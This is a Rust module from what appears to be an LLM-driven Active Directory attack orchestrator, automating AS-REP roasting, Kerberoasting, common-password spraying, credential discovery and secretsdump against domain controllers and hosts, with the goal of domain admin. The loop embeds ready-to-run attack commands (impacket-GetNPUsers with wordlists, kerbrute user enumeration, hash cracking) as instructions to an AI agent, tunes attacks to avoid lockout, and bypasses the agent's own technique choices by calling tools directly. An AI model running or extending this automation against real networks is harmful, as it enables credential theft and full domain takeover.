//! auto_credential_access -- kerberoast, AS-REP roast, password spray.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Build kerberoast dedup key from domain and username.
fn kerberoast_dedup_key(domain: &str, username: &str) -> String {
    format!("krb:{}:{}", domain.to_lowercase(), username.to_lowercase())
}

/// Build username spray dedup key from domain and username.
fn spray_dedup_key(domain: &str, username: &str) -> String {
    format!("{}:{}", domain.to_lowercase(), username.to_lowercase())
}

/// Build common password spray dedup key.
fn common_spray_dedup_key(domain: &str) -> String {
    format!("common:{}", domain.to_lowercase())
}

/// Build low-hanging fruit dedup key.
fn low_hanging_dedup_key(domain: &str, username: &str) -> String {
    format!("{}:{}", domain.to_lowercase(), username.to_lowercase())
}

/// Build secretsdump dedup key for credential-based dumps.
fn credential_secretsdump_dedup_key(ip: &str, domain: &str, username: &str) -> String {
    format!(
        "{}:{}:{}",
        ip,
        domain.to_lowercase(),
        username.to_lowercase()
    )
}

/// Resolve host domain from hostname FQDN (e.g. "dc01.contoso.local" -> "contoso.local").
fn resolve_host_domain_from_fqdn(hostname: &str) -> String {
    hostname
        .to_lowercase()
        .split_once('.')
        .map(|x| x.1)
        .unwrap_or("")
        .to_string()
}

/// Check if a host domain is related to a credential domain (same, child, or parent).
fn is_host_domain_related(host_domain: &str, cred_domain: &str) -> bool {
    if host_domain.is_empty() {
        return false;
    }
    let h = host_domain.to_lowercase();
    let c = cred_domain.to_lowercase();
    h == c || h.ends_with(&format!(".{c}")) || c.ends_with(&format!(".{h}"))
}

/// Complex credential access automation: kerberoast, AS-REP roast, password spray.
/// Interval: 15s + Notify wake. Matches Python `_auto_credential_access`.
pub async fn auto_credential_access(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let notify = dispatcher.credential_access_notify.clone();
    let mut interval = tokio::time::interval(Duration::from_secs(15));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = notify.notified() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Re-armable dedup. The cold-start AS-REP dispatch fires before
        // cross-forest LDAP enum has populated `state.users` for foreign
        // forests — at that point known_users is empty and the dispatch
        // uses the generic wordlist. Later, after the inter-realm ticket
        // lands and LDAP-via-ticket enumerates the foreign forest's
        // accounts in a SID-filtered cross-forest target, we MUST
        // re-dispatch with known_users populated; otherwise the
        // discovered usernames never get consumed by AS-REP. Key the
        // dedup on `domain:has_users` so the "empty" and "non-empty"
        // states are tracked independently — at most two dispatches per
        // domain across the operation lifetime.
        let asrep_work: Vec<(String, String, String)> =
            if !dispatcher.is_technique_allowed("asrep_roast") {
                Vec::new()
            } else {
                let state = dispatcher.state.read().await;
                state
                    .domains
                    .iter()
                    .filter_map(|domain| {
                        let dom_l = domain.to_lowercase();
                        let has_users = state.users.iter().any(|u| {
                            u.domain.to_lowercase() == dom_l
                                && !u.username.is_empty()
                                && !u.username.ends_with('$')
                        });
                        let dedup_key =
                            format!("{}:{}", dom_l, if has_users { "users" } else { "empty" });
                        if state.is_processed(DEDUP_ASREP_DOMAINS, &dedup_key) {
                            return None;
                        }
                        // Try DC map first, then fall back to target_ips[0]
                        let dc_ip = state
                            .domain_controllers
                            .get(domain)
                            .cloned()
                            .or_else(|| state.target_ips.first().cloned())?;
                        Some((domain.clone(), dc_ip, dedup_key))
                    })
                    .collect()
            };

        for (domain, dc_ip, dedup_key) in asrep_work {
            let (excluded_users, known_users) = {
                let state = dispatcher.state.read().await;
                let excluded = state.quarantined_principals_in_domain(&domain);
                // Pull every username already discovered for this domain. AS-REP
                // roasting needs a userlist to probe — `kerberos_user_enum_noauth`
                // works on some DCs but is denied on hardened targets where
                // anonymous SAMR returns STATUS_LOGON_FAILURE. Without a baked-in
                // list the LLM has nothing to roast and the dispatch is wasted.
                // We collect users from `state.users` (populated by initial enum
                // + cross-forest LDAP-via-ticket), filter out the ones that aren't
                // real principals (computer accounts ending in `$`), and pass
                // them as `known_users` so the agent can immediately run
                // `GetNPUsers -no-pass -usersfile <list>`. This is the load-
                // bearing path for compromising a SID-filtered foreign forest
                // via AS-REP — without it, the cross-forest LDAP enumeration's
                // payoff (discovered usernames) never gets consumed by the
                // AS-REP automation, and the chain stalls at the step right
                // before a roastable account's hash would be captured.
                let dom_l = domain.to_lowercase();
                let mut users: Vec<String> = state
                    .users
                    .iter()
                    .filter(|u| u.domain.to_lowercase() == dom_l)
                    .filter(|u| !u.username.is_empty() && !u.username.ends_with('$'))
                    .map(|u| u.username.clone())
                    .collect();
                users.sort();
                users.dedup();
                (excluded, users)
            };
            let mut payload = json!({
                "techniques": ["kerberos_user_enum_noauth", "asrep_roast", "username_as_password"],
                "target_ip": dc_ip,
                "domain": domain,
                "excluded_users": excluded_users.join(","),
            });
            if !known_users.is_empty() {
                payload["known_users"] = json!(known_users);
                payload["instructions"] = json!(format!(
                    "{} usernames already discovered for {}. Run \
                     `impacket-GetNPUsers -no-pass -dc-ip {} {}/ -usersfile <(echo \
                     \"$known_users\")` and harvest any $krb5asrep$ hashes; \
                     prioritise this over `kerberos_user_enum_noauth` (some \
                     DCs deny anonymous SAMR). Hand any roastable hash to the \
                     cracker tool immediately.",
                    known_users.len(),
                    domain,
                    dc_ip,
                    domain,
                ));
            } else {
                // Cold start: no usernames discovered yet. Without an explicit
                // userlist the LLM tends to call `kerberos_user_enum_noauth`,
                // see the default tiny wordlist return no hits on a custom AD,
                // and abandon the technique. Give it a concrete progressive
                // enumeration plan so it tries broader wordlists (names.txt,
                // top-usernames-shortlist.txt) before giving up — these
                // commonly hit lab-themed accounts on EC2 worker images
                // where seclists is preinstalled.
                payload["instructions"] = json!(format!(
                    "No usernames discovered yet for {dom}. Cold-start AS-REP \
                     enumeration plan: \
                     (1) `impacket-GetNPUsers -no-pass -dc-ip {ip} {dom}/ \
                     -usersfile /usr/share/seclists/Usernames/Names/names.txt \
                     -format hashcat` (zero-cred; returns $krb5asrep$ for any \
                     preauth-disabled account). \
                     (2) If step 1 returns no hashes, also try \
                     `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` \
                     and `/usr/share/seclists/Usernames/cirt-default-usernames.txt`. \
                     (3) For username enumeration via Kerberos error codes \
                     (KDC_ERR_C_PRINCIPAL_UNKNOWN vs KDC_ERR_PREAUTH_REQUIRED), \
                     run `kerbrute userenum --dc {ip} -d {dom} \
                     /usr/share/seclists/Usernames/Names/names.txt` if \
                     available. \
                     (4) Hand every $krb5asrep$ hash to the cracker tool \
                     immediately — even one cracked AS-REP hash unlocks an \
                     authenticated foothold in {dom}. \
                     Do NOT fall back to anonymous SAMR if it returns \
                     ACCESS_DENIED; that path is dead on hardened DCs.",
                    dom = domain,
                    ip = dc_ip,
                ));
            }

            // Mark dedup BEFORE either dispatch fires. The deterministic
            // path below is fire-and-forget; if we deferred marking until
            // after a successful LLM submit, a deferred/errored LLM submit
            // would leave the deterministic spawn unguarded — next 15s tick
            // would queue another background asrep_roast against the same
            // userlist. Mark first, dispatch second.
            dispatcher
                .state
                .write()
                .await
                .mark_processed(DEDUP_ASREP_DOMAINS, dedup_key.clone());
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_ASREP_DOMAINS, &dedup_key)
                .await;

            let priority = dispatcher.effective_priority("asrep_roast");
            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        domain = %domain,
                        dedup_key = %dedup_key,
                        known_users = known_users.len(),
                        "AS-REP roast dispatched"
                    );
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch AS-REP roast"),
            }

            // Deterministic AS-REP roast: when we already have a userlist,
            // skip the LLM and call the tool directly. The LLM agent loop
            // in the credential_access role consistently picks
            // `password_spray` and `username_as_password` over
            // `asrep_roast` despite the techniques ordering and explicit
            // instructions — this leaves the most reliable foothold path
            // for SID-filtered foreign forests (AS-REP roast of a preauth-
            // disabled account from the discovered userlist) unexercised.
            // dispatch_tool routes through the worker tool_exec subject and
            // its discoveries flow into state via push_realtime_discoveries.
            // Guarded by the dedup mark above — at most one deterministic
            // dispatch per (domain, has-users) transition.
            if !known_users.is_empty() {
                let det_args = json!({
                    "domain": domain,
                    "dc_ip": dc_ip,
                    "known_users": known_users,
                });
                let det_call = ares_llm::ToolCall {
                    id: format!("asrep_det_{}", uuid::Uuid::new_v4().simple()),
                    name: "asrep_roast".to_string(),
                    arguments: det_args,
                };
                let det_task_id = format!(
                    "asrep_det_{}",
                    &uuid::Uuid::new_v4().simple().to_string()[..12]
                );
                info!(
                    task_id = %det_task_id,
                    domain = %domain,
                    known_users = known_users.len(),
                    "AS-REP roast dispatched (direct tool, no LLM)"
                );
                let dispatcher_bg = dispatcher.clone();
                let domain_bg = domain.clone();
                tokio::spawn(async move {
                    match dispatcher_bg
                        .llm_runner
                        .tool_dispatcher()
                        .dispatch_tool("credential_access", &det_task_id, &det_call)
                        .await
                    {
                        Ok(result) => {
                            let hash_count = result
                                .discoveries
                                .as_ref()
                                .and_then(|d| d.get("hashes"))
                                .and_then(|h| h.as_array())
                                .map(|a| a.len())
                                .unwrap_or(0);
                            info!(
                                task_id = %det_task_id,
                                domain = %domain_bg,
                                hash_count,
                                "Deterministic AS-REP roast completed"
                            );
                        }
                        Err(e) => {
                            warn!(err = %e, domain = %domain_bg, "Deterministic AS-REP roast failed");
                        }
                    }
                });
            }
        }

        let kerberoast_work: Vec<(String, String, String, ares_core::models::Credential)> =
            if !dispatcher.is_technique_allowed("kerberoast") {
                Vec::new()
            } else {
                let state = dispatcher.state.read().await;
                state
                    .credentials
                    .iter()
                    .filter(|c| !c.domain.is_empty())
                    // Skip delegation accounts — Kerberoast is already done with
                    // other creds, and burning auth on delegation accounts risks
                    // lockout before S4U can use them.
                    .filter(|c| !state.is_delegation_account(&c.username))
                    // Skip quarantined credentials — locked out, retry after expiry.
                    .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
                    .filter_map(|cred| {
                        let cred_domain = cred.domain.to_lowercase();
                        let dedup = kerberoast_dedup_key(&cred_domain, &cred.username);
                        if state.is_processed(DEDUP_CRACK_REQUESTS, &dedup) {
                            return None;
                        }
                        // Exact domain match first (using robust DC resolution)
                        if let Some(dc_ip) = state.resolve_dc_ip(&cred_domain) {
                            return Some((dedup, dc_ip, cred_domain, cred.clone()));
                        }
                        // Fallback: check child domains (e.g. cred has "contoso.local"
                        // but user is actually in "child.contoso.local")
                        let suffix = format!(".{cred_domain}");
                        for (domain, dc_ip) in &state.all_domains_with_dcs() {
                            if domain.ends_with(&suffix) {
                                debug!(
                                    cred_domain = %cred_domain,
                                    child_domain = %domain,
                                    "Kerberoast: using child domain DC for parent-domain credential"
                                );
                                return Some((dedup, dc_ip.clone(), domain.clone(), cred.clone()));
                            }
                        }
                        // Last resort: use target_ips[0] if DC map has no entry for this domain
                        if let Some(fallback_ip) = state.target_ips.first().cloned() {
                            debug!(
                                cred_domain = %cred_domain,
                                fallback_ip = %fallback_ip,
                                "Kerberoast: using target IP fallback (no DC in map)"
                            );
                            return Some((dedup, fallback_ip, cred_domain, cred.clone()));
                        }
                        None
                    })
                    .take(if dispatcher.config.strategy.is_comprehensive() {
                        10
                    } else {
                        2
                    })
                    .collect()
            };

        for (dedup_key, dc_ip, resolved_domain, cred) in kerberoast_work {
            let priority = dispatcher.effective_priority("kerberoast");
            match dispatcher
                .request_credential_access("kerberoast", &dc_ip, &resolved_domain, &cred, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    debug!(task_id = %task_id, domain = %resolved_domain, "Kerberoast dispatched");
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_CRACK_REQUESTS, dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_CRACK_REQUESTS, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch kerberoast"),
            }
        }

        let spray_work: Vec<(String, String, String)> = {
            let state = dispatcher.state.read().await;
            state
                .users
                .iter()
                .filter(|u| !u.domain.is_empty())
                // Skip AD built-in disabled accounts (guest, krbtgt, etc.).
                // Spraying these can never succeed and burns badPwdCount budget
                // that real accounts share under domain lockout policy.
                .filter(|u| !ares_core::models::is_always_disabled_account(&u.username))
                // Skip delegation accounts — their auth budget is reserved for
                // S4U exploitation. Spraying them causes lockout before S4U fires.
                .filter(|u| !state.is_delegation_account(&u.username))
                .filter(|u| !state.is_principal_quarantined(&u.username, &u.domain))
                .filter_map(|u| {
                    let user_domain = u.domain.to_lowercase();
                    let dedup = spray_dedup_key(&user_domain, &u.username);
                    if state.is_processed(DEDUP_USERNAME_SPRAY, &dedup) {
                        return None;
                    }
                    // Exact match or child-domain fallback
                    let dc_ip = state
                        .domain_controllers
                        .get(&user_domain)
                        .cloned()
                        .or_else(|| {
                            let suffix = format!(".{user_domain}");
                            state
                                .domain_controllers
                                .iter()
                                .find(|(d, _)| d.ends_with(&suffix))
                                .map(|(_, ip)| ip.clone())
                        })?;
                    Some((dedup, dc_ip, u.domain.clone()))
                })
                .take(if dispatcher.config.strategy.is_comprehensive() {
                    20
                } else {
                    5
                })
                .collect()
        };

        // Submit one spray task per domain (batched)
        let mut sprayed_domains = std::collections::HashSet::new();
        for (_dedup_key, dc_ip, domain) in &spray_work {
            if sprayed_domains.contains(domain) {
                continue;
            }
            sprayed_domains.insert(domain.clone());

            let excluded_users = dispatcher
                .state
                .read()
                .await
                .quarantined_principals_in_domain(domain);
            let payload = json!({
                "technique": "username_as_password",
                "target_ip": dc_ip,
                "domain": domain,
                "excluded_users": excluded_users.join(","),
            });

            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, 4)
                .await
            {
                Ok(Some(task_id)) => {
                    debug!(task_id = %task_id, domain = %domain, "Password spray dispatched");
                    // Mark all users in this domain's batch as processed
                    for (dk, _, d) in &spray_work {
                        if d == domain {
                            dispatcher
                                .state
                                .write()
                                .await
                                .mark_processed(DEDUP_USERNAME_SPRAY, dk.clone());
                            let _ = dispatcher
                                .state
                                .persist_dedup(&dispatcher.queue, DEDUP_USERNAME_SPRAY, dk)
                                .await;
                        }
                    }
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch password spray"),
            }
        }

        // Mirrors Python's fast credential discovery — dispatches high-success-rate
        // techniques that find hardcoded/stored passwords in Active Directory.
        let low_hanging_work: Vec<(String, String, ares_core::models::Credential)> = {
            let state = dispatcher.state.read().await;
            state
                .credentials
                .iter()
                .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
                // Skip delegation accounts — their auth is reserved for S4U.
                .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
                .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
                .filter_map(|cred| {
                    let cred_domain = cred.domain.to_lowercase();
                    let dedup = low_hanging_dedup_key(&cred_domain, &cred.username);
                    if state.is_processed(DEDUP_LOW_HANGING, &dedup) {
                        return None;
                    }
                    // Find DC for this credential's domain
                    let dc_ip = state
                        .domain_controllers
                        .get(&cred_domain)
                        .cloned()
                        .or_else(|| {
                            let suffix = format!(".{cred_domain}");
                            state
                                .domain_controllers
                                .iter()
                                .find(|(d, _)| d.ends_with(&suffix))
                                .map(|(_, ip)| ip.clone())
                        })
                        .or_else(|| state.target_ips.first().cloned())?;
                    Some((dedup, dc_ip, cred.clone()))
                })
                .take(if dispatcher.config.strategy.is_comprehensive() {
                    10
                } else {
                    2
                })
                .collect()
        };

        for (dedup_key, dc_ip, cred) in low_hanging_work {
            let priority = dispatcher.effective_priority("low_hanging_fruit");
            match dispatcher
                .request_low_hanging_fruit(&dc_ip, &cred.domain, &cred, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        domain = %cred.domain,
                        username = %cred.username,
                        "Low-hanging fruit credential discovery dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_LOW_HANGING, dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_LOW_HANGING, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch low-hanging fruit"),
            }
        }

        // Dispatches secretsdump for new credentials against hosts in the same
        // domain (or child/parent domains). Cross-domain attempts generate
        // failed auths that trigger AD account lockout.
        // Credentials may be local admin on member servers — secretsdump fails
        // fast if not, but when it succeeds it's the fastest path to DA.
        let sd_work: Vec<(String, String, ares_core::models::Credential)> =
            if !dispatcher.is_technique_allowed("secretsdump") {
                Vec::new()
            } else {
                let state = dispatcher.state.read().await;

                // Skip only when ALL forests are dominated (unless continue_after_da)
                if !dispatcher.config.strategy.should_continue_after_da()
                    && state.has_domain_admin
                    && state.all_forests_dominated()
                {
                    Vec::new()
                } else {
                    let mut items = Vec::new();
                    for cred in state
                        .credentials
                        .iter()
                        .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
                        // Skip delegation accounts — secretsdump will always fail
                        // (they're not admin) and burns auth budget needed for S4U.
                        .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
                        .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
                    {
                        let cred_domain = cred.domain.to_lowercase();
                        for host in &state.hosts {
                            // Resolve host domain: prefer hostname FQDN, fall back
                            // to domain_controllers map for bare-IP hosts.
                            let host_domain = {
                                let from_hostname = resolve_host_domain_from_fqdn(&host.hostname);
                                if from_hostname.is_empty() {
                                    // Check if this IP is a known DC
                                    state
                                        .domain_controllers
                                        .iter()
                                        .find(|(_, ip)| ip.as_str() == host.ip)
                                        .map(|(d, _)| d.to_lowercase())
                                        .unwrap_or_default()
                                } else {
                                    from_hostname
                                }
                            };
                            // Only target same-domain hosts. Skip unknown-domain
                            // hosts — they'll be retried next cycle after nmap
                            // populates hostnames.
                            if !is_host_domain_related(&host_domain, &cred_domain) {
                                continue;
                            }

                            let dedup = credential_secretsdump_dedup_key(
                                &host.ip,
                                &cred_domain,
                                &cred.username,
                            );
                            if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
                                items.push((dedup, host.ip.clone(), cred.clone()));
                            }
                        }
                    }
                    let limit = if dispatcher.config.strategy.is_comprehensive() {
                        20
                    } else {
                        5
                    };
                    items.into_iter().take(limit).collect()
                }
            };

        for (dedup_key, target_ip, cred) in sd_work {
            let priority = if cred.is_admin { 2 } else { 7 };
            match dispatcher
                .request_secretsdump(&target_ip, &cred, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        target = %target_ip,
                        username = %cred.username,
                        "Credential secretsdump dispatched"
                    );
                    {
                        let mut state = dispatcher.state.write().await;
                        state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
                        state.mark_credential_capture_in_flight(&cred.domain);
                    }
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch credential secretsdump"),
            }
        }

        // Keep spraying common passwords until we find admin or achieve DA.
        let common_spray_work: Vec<(String, String)> =
            if !dispatcher.is_technique_allowed("password_spray") {
                Vec::new()
            } else {
                let state = dispatcher.state.read().await;
                if (state.has_domain_admin && state.all_forests_dominated())
                    || state.credentials.iter().any(|c| c.is_admin)
                {
                    // All forests dominated or have admin creds — skip common spray
                    Vec::new()
                } else {
                    state
                        .domain_controllers
                        .iter()
                        .filter(|(domain, _)| {
                            let key = common_spray_dedup_key(domain);
                            !state.is_processed(DEDUP_PASSWORD_SPRAY, &key)
                        })
                        // Only spray after initial recon (AS-REP) has completed.
                        // This prevents spraying in the first cycle when Kerberoast
                        // hasn't had time to collect hashes yet. AS-REP dedup is
                        // keyed `domain:empty` or `domain:users` (re-armable on
                        // user-list transitions); either form satisfies the gate.
                        .filter(|(domain, _)| {
                            let d = domain.to_lowercase();
                            let empty_key = format!("{d}:empty");
                            let users_key = format!("{d}:users");
                            state.is_processed(DEDUP_ASREP_DOMAINS, &empty_key)
                                || state.is_processed(DEDUP_ASREP_DOMAINS, &users_key)
                        })
                        // Only spray after delegation enumeration has dispatched for
                        // at least one credential in this domain. Spraying before
                        // delegation can lock out accounts and prevent find_delegation
                        // from using valid credentials.
                        .filter(|(domain, _)| {
                            let prefix = format!("{}:", domain.to_lowercase());
                            state.has_processed_prefix(DEDUP_DELEGATION_CREDS, &prefix)
                        })
                        // Skip domains with UNCRACKED Kerberoast hashes —
                        // offline cracking is safer (no lockout risk) and handles
                        // complex passwords that spray would never find.
                        // Once all hashes are cracked (or none exist), spray proceeds
                        // as a fallback path for accounts without SPNs.
                        .filter(|(domain, _)| {
                            let d = domain.to_lowercase();
                            !state.hashes.iter().any(|h| {
                                h.hash_type.to_lowercase().contains("kerberoast")
                                    && h.domain.to_lowercase() == d
                                    && h.cracked_password.is_none()
                            })
                        })
                        .map(|(domain, dc_ip)| (domain.clone(), dc_ip.clone()))
                        .collect()
                }
            };

        for (domain, dc_ip) in common_spray_work {
            let excluded_users = dispatcher
                .state
                .read()
                .await
                .quarantined_principals_in_domain(&domain);
            let payload = json!({
                "techniques": ["password_spray", "username_as_password"],
                "reason": "low_hanging_fruit",
                "target_ip": dc_ip,
                "domain": domain,
                "use_common_passwords": true,
                "acknowledge_no_policy": true,
                "excluded_users": excluded_users.join(","),
            });

            // Mark as processed BEFORE submitting to prevent duplicate deferred entries.
            // The task will be dispatched or deferred regardless.
            let key = common_spray_dedup_key(&domain);
            dispatcher
                .state
                .write()
                .await
                .mark_processed(DEDUP_PASSWORD_SPRAY, key.clone());
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_PASSWORD_SPRAY, &key)
                .await;

            let priority = dispatcher.effective_priority("password_spray");
            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(task_id = %task_id, domain = %domain, "Common password spray dispatched");
                }
                Ok(None) => {
                    debug!(domain = %domain, "Common password spray deferred");
                }
                Err(e) => warn!(err = %e, "Failed to dispatch common password spray"),
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- kerberoast_dedup_key ---

    #[test]
    fn kerberoast_dedup_key_basic() {
        assert_eq!(
            kerberoast_dedup_key("CONTOSO.LOCAL", "Administrator"),
            "krb:contoso.local:administrator"
        );
    }

    #[test]
    fn kerberoast_dedup_key_already_lowercase() {
        assert_eq!(
            kerberoast_dedup_key("corp.net", "svc_sql"),
            "krb:corp.net:svc_sql"
        );
    }

    #[test]
    fn kerberoast_dedup_key_empty_inputs() {
        assert_eq!(kerberoast_dedup_key("", ""), "krb::");
    }

    // --- spray_dedup_key ---

    #[test]
    fn spray_dedup_key_basic() {
        assert_eq!(
            spray_dedup_key("CONTOSO.LOCAL", "jdoe"),
            "contoso.local:jdoe"
        );
    }

    #[test]
    fn spray_dedup_key_mixed_case() {
        assert_eq!(spray_dedup_key("Corp.Net", "Admin"), "corp.net:admin");
    }

    #[test]
    fn spray_dedup_key_empty() {
        assert_eq!(spray_dedup_key("", ""), ":");
    }

    // --- common_spray_dedup_key ---

    #[test]
    fn common_spray_dedup_key_basic() {
        assert_eq!(
            common_spray_dedup_key("CONTOSO.LOCAL"),
            "common:contoso.local"
        );
    }

    #[test]
    fn common_spray_dedup_key_empty() {
        assert_eq!(common_spray_dedup_key(""), "common:");
    }

    // --- low_hanging_dedup_key ---

    #[test]
    fn low_hanging_dedup_key_basic() {
        assert_eq!(
            low_hanging_dedup_key("CONTOSO.LOCAL", "Admin"),
            "contoso.local:admin"
        );
    }

    #[test]
    fn low_hanging_dedup_key_empty() {
        assert_eq!(low_hanging_dedup_key("", ""), ":");
    }

    // --- credential_secretsdump_dedup_key ---

    #[test]
    fn credential_secretsdump_dedup_key_basic() {
        assert_eq!(
            credential_secretsdump_dedup_key("192.168.58.1", "CONTOSO.LOCAL", "Admin"),
            "192.168.58.1:contoso.local:admin"
        );
    }

    #[test]
    fn credential_secretsdump_dedup_key_preserves_ip() {
        // IP should not be lowercased (it's already case-insensitive)
        assert_eq!(
            credential_secretsdump_dedup_key("192.168.58.100", "Corp.Net", "SVC"),
            "192.168.58.100:corp.net:svc"
        );
    }

    #[test]
    fn credential_secretsdump_dedup_key_empty() {
        assert_eq!(credential_secretsdump_dedup_key("", "", ""), "::");
    }

    // --- resolve_host_domain_from_fqdn ---

    #[test]
    fn resolve_host_domain_from_fqdn_typical() {
        assert_eq!(
            resolve_host_domain_from_fqdn("dc01.contoso.local"),
            "contoso.local"
        );
    }

    #[test]
    fn resolve_host_domain_from_fqdn_nested() {
        assert_eq!(
            resolve_host_domain_from_fqdn("web01.child.contoso.local"),
            "child.contoso.local"
        );
    }

    #[test]
    fn resolve_host_domain_from_fqdn_case_insensitive() {
        assert_eq!(
            resolve_host_domain_from_fqdn("DC01.CONTOSO.LOCAL"),
            "contoso.local"
        );
    }

    #[test]
    fn resolve_host_domain_from_fqdn_bare_hostname() {
        assert_eq!(resolve_host_domain_from_fqdn("dc01"), "");
    }

    #[test]
    fn resolve_host_domain_from_fqdn_empty() {
        assert_eq!(resolve_host_domain_from_fqdn(""), "");
    }

    // --- is_host_domain_related ---

    #[test]
    fn is_host_domain_related_same_domain() {
        assert!(is_host_domain_related("contoso.local", "contoso.local"));
    }

    #[test]
    fn is_host_domain_related_case_insensitive() {
        assert!(is_host_domain_related("CONTOSO.LOCAL", "contoso.local"));
    }

    #[test]
    fn is_host_domain_related_child_of_cred() {
        assert!(is_host_domain_related(
            "child.contoso.local",
            "contoso.local"
        ));
    }

    #[test]
    fn is_host_domain_related_parent_of_cred() {
        assert!(is_host_domain_related(
            "contoso.local",
            "child.contoso.local"
        ));
    }

    #[test]
    fn is_host_domain_related_unrelated() {
        assert!(!is_host_domain_related("corp.net", "contoso.local"));
    }

    #[test]
    fn is_host_domain_related_empty_host() {
        assert!(!is_host_domain_related("", "contoso.local"));
    }

    #[test]
    fn is_host_domain_related_empty_cred() {
        assert!(!is_host_domain_related("contoso.local", ""));
    }

    #[test]
    fn is_host_domain_related_both_empty() {
        assert!(!is_host_domain_related("", ""));
    }
}
